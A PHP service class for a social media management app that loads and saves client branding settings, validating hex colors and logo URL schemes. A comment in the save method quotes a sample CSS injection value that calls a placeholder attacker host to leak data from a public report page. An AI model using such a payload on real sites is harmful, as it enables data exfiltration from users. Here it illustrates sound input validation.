<?php

class BrandingService
{
    private BrandingSetting $model;

    public function __construct()
    {
        $this->model = new BrandingSetting();
    }

    public function get(int $clientId): array
    {
        $settings = $this->model->getByClient($clientId);
        if (!$settings) {
            return [
                'logo_url' => '',
                'dark_logo_url' => '',
                'primary_color' => '#6366f1',
                'secondary_color' => '#8b5cf6',
                'login_bg_url' => '',
                'particles_enabled' => 1,
                'company_name' => APP_NAME,
                'tagline' => 'AI-Powered Social Media Management',
                'first_comment' => '',
                'favicon_url' => '',
            ];
        }
        // Ensure dark_logo_url key always exists even on older rows
        if (!array_key_exists('dark_logo_url', $settings)) {
            $settings['dark_logo_url'] = '';
        }
        return $settings;
    }

    public function save(int $clientId, array $data): void
    {
        // Validate color inputs: they get interpolated into CSS blocks
        // (including the PUBLIC shared report page) so we must reject
        // anything that isn't a plain hex color. A malicious value like
        // "red;background:url(//attacker.tld/log)" would otherwise exfiltrate
        // data via background-image requests from the report page.
        foreach (['primary_color', 'secondary_color'] as $colorField) {
            if (isset($data[$colorField])) {
                $val = trim((string) $data[$colorField]);
                if ($val === '' || !preg_match('/^#[0-9a-fA-F]{3,8}$/', $val)) {
                    // Drop invalid values so the existing DB value / default stays
                    unset($data[$colorField]);
                }
            }
        }

        // Validate logo URL schemes — only allow http(s) or relative app URLs.
        // Blocks javascript: and data: URLs that could abuse OG:image crawlers
        // or browser behavior in edge cases. Empty strings are allowed
        // (used to clear an existing logo).
        foreach (['logo_url', 'dark_logo_url', 'login_bg_url', 'favicon_url'] as $urlField) {
            if (isset($data[$urlField]) && $data[$urlField] !== '') {
                $u = (string) $data[$urlField];
                $isSafe = (
                    str_starts_with($u, 'http://')
                    || str_starts_with($u, 'https://')
                    || str_starts_with($u, '/')
                    || str_starts_with($u, BASE_URL)
                );
                if (!$isSafe) {
                    unset($data[$urlField]);
                }
            }
        }

        // If validation stripped every field, there's nothing to save.
        // Early-return so the base model doesn't build an empty SET clause.
        if (empty($data)) {
            return;
        }

        $this->model->updateByClient($clientId, $data);
    }

    public function getContext(int $clientId): array
    {
        $branding = $this->get($clientId);
        return [
            'company_name' => $branding['company_name'] ?? APP_NAME,
            'primary_color' => $branding['primary_color'] ?? '#6366f1',
            'tagline' => $branding['tagline'] ?? '',
            'phone' => $branding['phone'] ?? '',
            'website' => $branding['website'] ?? '',
        ];
    }

    public function isProfileComplete(int $clientId): array
    {
        $b = $this->get($clientId);
        $missing = [];
        if (empty(trim($b['company_name'] ?? '')) || ($b['company_name'] ?? '') === APP_NAME) $missing[] = 'Company Name';
        if (empty(trim($b['website'] ?? ''))) $missing[] = 'Website';
        if (empty(trim($b['phone'] ?? ''))) $missing[] = 'Phone Number';
        return $missing;
    }
}
